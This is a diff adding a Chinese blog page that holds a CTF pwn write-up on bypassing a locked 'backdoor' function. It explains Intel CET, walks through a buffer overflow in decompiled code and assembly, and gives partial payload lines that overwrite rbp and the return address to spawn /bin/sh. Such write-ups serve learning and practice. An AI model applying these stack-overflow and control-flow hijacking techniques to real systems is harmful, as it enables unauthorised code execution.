@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/meow.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/meow.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="ytiTpj8Ol2naa1JDTwZxRYelNQFe4fgRvG5XcJmZ9N0">
+  <meta name="msvalidate.01" content="2B6959B722A9727D346D9795E31C5112">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"mintind.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.27.0","exturl":true,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"always","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"tokyo-night-dark","dark":"tokyo-night-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"flat"},"fold":{"enable":true,"height":500},"language":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="你好，请加入Jmp.Cliff教">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【PWN】ret2backdoor by Jmp.Cliff">
+<meta property="og:url" content="https://mintind.github.io/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/index.html">
+<meta property="og:site_name" content="Mintind&#39;s Blog">
+<meta property="og:description" content="你好，请加入Jmp.Cliff教">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://mintind.github.io/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251124223549043.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251124232207069.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251125095519617.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251127123855086.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251125233937411.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251126105700361.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251126105247969.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251126105427228.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251126112111913.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251126112127865.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251126112901705.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251126112920750.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251126233258223.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251126233659744.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251126233903567.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251127113739185.png">
+<meta property="article:published_time" content="2025-11-23T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-11-23T16:00:00.000Z">
+<meta property="article:author" content="Mintind">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mintind.github.io/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251124223549043.png">
+
+
+<link rel="canonical" href="https://mintind.github.io/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://mintind.github.io/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/","path":"2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/","title":"【PWN】ret2backdoor by Jmp.Cliff"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>【PWN】ret2backdoor by Jmp.Cliff | Mintind's Blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Mintind's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">此心安处是吾乡</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">60</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">16</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">80</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5"><span class="nav-number">1.</span> <span class="nav-text">检查</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Intel-CET"><span class="nav-number">2.</span> <span class="nav-text">Intel CET</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SHSTK"><span class="nav-number">2.1.</span> <span class="nav-text">SHSTK</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IBT"><span class="nav-number">2.2.</span> <span class="nav-text">IBT</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#endbr64-32"><span class="nav-number">2.2.1.</span> <span class="nav-text">endbr64&#x2F;32</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E8%AF%95"><span class="nav-number">4.</span> <span class="nav-text">调试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%97%E4%BA%86%E8%BF%98%E6%98%AF%E5%88%AB%E7%9C%8B%E4%BA%86"><span class="nav-number">4.1.</span> <span class="nav-text">算了还是别看了</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E4%BA%86%E6%88%91%E5%8E%BB"><span class="nav-number">4.2.</span> <span class="nav-text">通了我去</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">5.</span> <span class="nav-text">exp</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Mintind</p>
+  <div class="site-description" itemprop="description">Record to Remember</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">80</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">60</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21pbnRpbmQ=" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;mintind"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mintind.github.io/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Mintind">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mintind's Blog">
+      <meta itemprop="description" content="Record to Remember">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="【PWN】ret2backdoor by Jmp.Cliff | Mintind's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          【PWN】ret2backdoor by Jmp.Cliff<span class="exturl post-edit-link" data-url="aHR0cHM6Ly9naXRodWIuY29tL01pbnRpbmQvbWludGluZC1oZXhvLWJsb2cvZWRpdC9tYWluL3NvdXJjZS9fcG9zdHMvQ1RGL1BXTi9yZXQyYmFja2Rvb3JfYnlfSm1wLkNsaWZmLm1k" title="编辑"><i class="fa fa-pen-nib"></i></span>
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-11-24 00:00:00" itemprop="dateCreated datePublished" datetime="2025-11-24T00:00:00+08:00">2025-11-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1.6k</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>你好，请加入Jmp.Cliff教</p>
+<span id="more"></span>
+
+<p>鹅鹅鹅好乱的一篇…</p>
+<h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><p>checksec</p>
+<p><img src="/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251124223549043.png" alt="image-20251124223549043"></p>
+<p>啊，不认识的项，学习</p>
+<h2 id="Intel-CET"><a href="#Intel-CET" class="headerlink" title="Intel CET"></a>Intel CET</h2><p><strong>控制流强制技术 (Controlflow Enforcement Technology, CET)</strong></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9wd25lcmlrLmNuL2luZGV4LnBocC9hcmNoaXZlcy8xOS8=">https://pwnerik.cn/index.php/archives/19/<i class="fa fa-external-link-alt"></i></span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9saW51eGtlcm5lbC5vcmcuY24vZG9jL2h0bWwvbGF0ZXN0L2FyY2gveDg2L3Noc3RrLmh0bWw=">https://linuxkernel.org.cn/doc/html/latest/arch/x86/shstk.html<i class="fa fa-external-link-alt"></i></span></p>
+<h3 id="SHSTK"><a href="#SHSTK" class="headerlink" title="SHSTK"></a>SHSTK</h3><p><strong>SHSTK</strong>: SHadow STacK, 阴影栈。</p>
+<blockquote>
+<p>SHSTK 是一种后向控制流完整性（Backward-edge CFI）检查（简单来说是在“返回”时的检查）。</p>
+<p>影子堆栈是从内存中分配的二级堆栈，应用程序无法直接修改。执行 CALL 指令时，处理器会将返回地址推送到普通堆栈和影子堆栈。函数返回时，处理器会弹出影子堆栈副本并将其与普通堆栈副本进行比较。如果两者不同，处理器会引发控制保护故障。</p>
+</blockquote>
+<p>所以所有ROP攻击都会失效</p>
+<h3 id="IBT"><a href="#IBT" class="headerlink" title="IBT"></a>IBT</h3><p><strong>IBT</strong>: Indirect Branch Tracking, 间接分支追踪。</p>
+<blockquote>
+<p>IBT 是一种前向控制流完整性（Forward-edge CFI）检查（简单来说是在“调用”时的检查）。</p>
+<p>CPU 每当执行间接调用及跳转时都检查目标的指令是否为 <code>endbr64/32</code>，如果是就不执行任何操作（类似 <code>nop</code>），如果不是就产生异常。</p>
+</blockquote>
+<p>通过间接分支（call rax &#x2F; jmp rax）跳到任意位置若目标没有 ENDBR，会被 IBT 拒绝</p>
+<h4 id="endbr64-32"><a href="#endbr64-32" class="headerlink" title="endbr64&#x2F;32"></a>endbr64&#x2F;32</h4><p><code>endbr64</code>（以及 32 位版本的 <code>endbr32</code>）是IBT机制的核心指令。作用：告诉 CPU“这里才是合法的间接跳转&#x2F;调用目标”，否则就触发异常终止程序。</p>
+<p>每个可能被间接调用的函数入口都会自动生成一条 endbr64</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>main</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  my_init(argc, argv, envp);</span><br><span class="line">  lock = <span class="number">1</span>;</span><br><span class="line">  vuln();</span><br><span class="line">  lock = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>vuln 有溢出</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I heard that you&#x27;re good at ret2backdoor.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;However, what do you do if I lock the back door?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x48u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>backdoor</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *command; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !lock )</span><br><span class="line">    command = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span> system(command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>endbr64长这样，新鲜</p>
+<p><img src="/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251124232207069.png" alt="image-20251124232207069"></p>
+<p>lock。全局变量，改不了	</p>
+<p><img src="/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251125095519617.png" alt="image-20251125095519617"></p>
+<p>不明白，去问了思路。说是看backdoor的汇编，可以跳过对lock的检查（意思是跳过了<code>lea     rax, aBinSh     ; &quot;/bin/sh&quot;</code>也没事），直接到给command赋值的地方，command指针赋值是栈上地址，可以通过修改rbp值来设定command，所以可以想办法找一个&#x2F;bin&#x2F;sh贴上去。</p>
+<p>backdoor汇编：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004011E1 ; Attributes: bp-based frame</span><br><span class="line">.text:00000000004011E1</span><br><span class="line">.text:00000000004011E1                 public backdoor</span><br><span class="line">.text:00000000004011E1 backdoor        proc near</span><br><span class="line">.text:00000000004011E1</span><br><span class="line">.text:00000000004011E1 command         = qword ptr -10h</span><br><span class="line">.text:00000000004011E1</span><br><span class="line">.text:00000000004011E1 ; __unwind &#123;</span><br><span class="line">.text:00000000004011E1                 endbr64</span><br><span class="line">.text:00000000004011E5                 push    rbp</span><br><span class="line">.text:00000000004011E6                 mov     rbp, rsp</span><br><span class="line">.text:00000000004011E9                 sub     rsp, 10h</span><br><span class="line">.text:00000000004011ED                 mov     eax, cs:lock</span><br><span class="line">.text:00000000004011F3                 test    eax, eax</span><br><span class="line">.text:00000000004011F5                 jnz     short loc_401202</span><br><span class="line">.text:00000000004011F7                 lea     rax, aBinSh     ; &quot;/bin/sh&quot;</span><br><span class="line">.text:00000000004011FE                 mov     [rbp+command], rax</span><br><span class="line">.text:0000000000401202</span><br><span class="line">.text:0000000000401202 loc_401202:                             ; CODE XREF: backdoor+14↑j</span><br><span class="line">.text:0000000000401202                 mov     rax, [rbp+command]</span><br><span class="line">.text:0000000000401206                 mov     rdi, rax        ; command</span><br><span class="line">.text:0000000000401209                 call    _system</span><br><span class="line">.text:000000000040120E                 nop</span><br><span class="line">.text:000000000040120F                 leave</span><br><span class="line">.text:0000000000401210                 retn</span><br><span class="line">.text:0000000000401210 ; &#125; // starts at 4011E1</span><br><span class="line">.text:0000000000401210 backdoor        endp</span><br></pre></td></tr></table></figure>
+
+<p>也就是执行流是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, 10h</span><br><span class="line">mov     eax, cs:lock</span><br><span class="line">test    eax, eax</span><br><span class="line">mov     rax, [rbp+command]</span><br><span class="line">mov     rdi, rax        ; command</span><br><span class="line">call    _system</span><br><span class="line">nop</span><br><span class="line">leave</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
+
+<p>找一下&#x2F;bin&#x2F;sh，在0x402008有</p>
+<p><img src="/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251127123855086.png" alt="image-20251127123855086"></p>
+<p>分析一下command应该怎么改。command是从[rbp+command]处取的，也就是<code>[rbp-10h]</code></p>
+<p>这里是神的学弟的wp的解释：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmFreXV1LnNwYWNlLzIwMjMvMDkvMjQvTkVVUUNTQS9ORVVRQ1NBMjAyM0ZpcnN0R2FtZVdyaXRlVXAv">https://blog.akyuu.space/2023/09/24/NEUQCSA/NEUQCSA2023FirstGameWriteUp/<i class="fa fa-external-link-alt"></i></span></p>
+<blockquote>
+<p>而且它读取的地址是 rbp-0x10. 因此我们可以把 shell 放在 rbp-0x10 的地址上面。<br>具体实现，发现汇编指令里面有两条指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x4011e5      push   rbp</span><br><span class="line">0x4011e6      mov    rbp, rsp</span><br><span class="line">0x4011e9      sub    rsp, 0x10</span><br></pre></td></tr></table></figure>
+
+<p>那么执行过这两条指令之后，rbp-0x10 就是 rsp。因此，我们可以把 shell 的地址放在栈里面的 rbp 上面，这样在 shell 会先在 rsp 上面，然后在被 mov 到 rbp 上面</p>
+</blockquote>
+<p>非常好，我直到摸得差不多了才意识到这一点，都怪神误导我</p>
+<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>包含大量错误尝试。但是都是路嘛我也懒得整理了</p>
+<h3 id="算了还是别看了"><a href="#算了还是别看了" class="headerlink" title="算了还是别看了"></a>算了还是别看了</h3><p>不是，您怎么到这的。有这方法我还去改什么command</p>
+<p><img src="/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251125233937411.png" alt="image-20251125233937411"></p>
+<p>调到最后已经进system并且参数是binsh了，但是没对齐哈哈</p>
+<p>刚进backdoor时，因为刚执行完<code>push    rbp; mov     rbp, rsp</code>，rbp和rsp相等，指向旧rbp</p>
+<p><img src="/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251126105700361.png" alt="image-20251126105700361"></p>
+<p>rsp减完变成0x7ffd27bfcea8，内容是buffer的40偏移处</p>
+<p><img src="/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251126105247969.png" alt="image-20251126105247969"></p>
+<p>执行完rax赋值，mov    rax, qword ptr [rbp - 0x10]，rbp - 0x10就是rsp那个地址，所以rax取了0x7ffd27bfcea8处的值，buffer中的kaaalaaa</p>
+<p><img src="/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251126105427228.png" alt="image-20251126105427228"></p>
+<p>但是这是怎么搞的呢。于是又去重新看了，buffer溢出的情况。输入用cyclic拉满先。断点下在了0x40124B，vuln里刚call完read回来的那条指令</p>
+<p><img src="/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251126112111913.png" alt="image-20251126112111913"></p>
+<p><img src="/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251126112127865.png" alt="image-20251126112127865"></p>
+<p>继续</p>
+<p><img src="/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251126112901705.png" alt="image-20251126112901705"></p>
+<p><img src="/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251126112920750.png" alt="image-20251126112920750"></p>
+<p>payload +&#x3D; p64(0x402008) # addr of &#x2F;bin&#x2F;sh -&gt; rsp<br>payload +&#x3D; p64(0x402018) # rbp<br>payload +&#x3D; p64(0x401210) # ret<br>payload +&#x3D; p64(0x4011E9) # eip</p>
+<p>试着加了个ret，结果呢也没对齐，而且rbp是0x68732f6e69622f，<code>/bin/sh</code>的字符串编码，很神奇了（哦，因为前面写错了</p>
+<p><img src="/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251126233258223.png" alt="image-20251126233258223"></p>
+<p>看看这个是怎么来的</p>
+<p><img src="/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251126233659744.png" alt="image-20251126233659744"></p>
+<p>rax变成存值了。当前的rbp就是0x402018，[rbp - 0x10]确实是&#x2F;bin&#x2F;sh的值，也确实</p>
+<p><img src="/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251126233903567.png" alt="image-20251126233903567"></p>
+<p>但是为什么加个ret会有这种变化。之前rbp存的是指向0x402018的地址，这会直接是0x402018了</p>
+<h3 id="通了我去"><a href="#通了我去" class="headerlink" title="通了我去"></a>通了我去</h3><p>payload +&#x3D; p64(0x402008) # rbp<br>payload +&#x3D; p64(0x401210) # ret</p>
+<p>payload +&#x3D; p64(0x4011E1) </p>
+<p><img src="/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/image-20251127113739185.png" alt="image-20251127113739185"></p>
+<p>此时其实是<code>rsp -&gt; 0x402008</code>，而<code>rsp=rbp-0x10</code>，取<code>rbp - 0x10</code>的值也就是取rsp处的值0x402008。最后system参数就是0x402008。而且可以看到是对齐的。</p>
+<p>这题要点是rsp处的值，而对比上面两种情况（嗯此处指的对齐和没对齐）可以发现，rsp不管怎样都会先和rbp一起指向0x402008，后面-0x10，向上长两格，所以rsp就会指向，在payload中离返回地址差两个地址处的值</p>
+<p>对齐的情况，返回地址是0x4011E1，往前走两个就是0x402008，所以rsp指向0x402008</p>
